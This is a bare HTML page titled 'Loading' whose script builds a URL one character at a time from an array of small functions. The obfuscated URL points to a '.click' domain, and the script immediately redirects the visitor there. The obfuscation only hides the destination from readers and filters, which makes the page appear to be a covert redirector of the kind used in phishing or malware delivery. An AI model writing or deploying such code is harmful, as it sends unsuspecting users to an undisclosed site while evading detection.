<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            function() { return 't'; },
            function() { return 't'; },
            _ => 'p',
            function() { return 's'; },
            function() { return ':'; },
            function() { return '/'; },
            () => '/',
            () => 'v',
            () => 'e',
            _ => 'r',
            () => 'g',
            _ => 'e',
            function() { return 'n'; },
            _ => '.',
            _ => 'c',
            function() { return 'l'; },
            function() { return 'i'; },
            _ => 'c',
            function() { return 'k'; },
            _ => '/',
            _ => 's',
            _ => '/',
            () => 'n',
            () => 'e',
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>

</html>
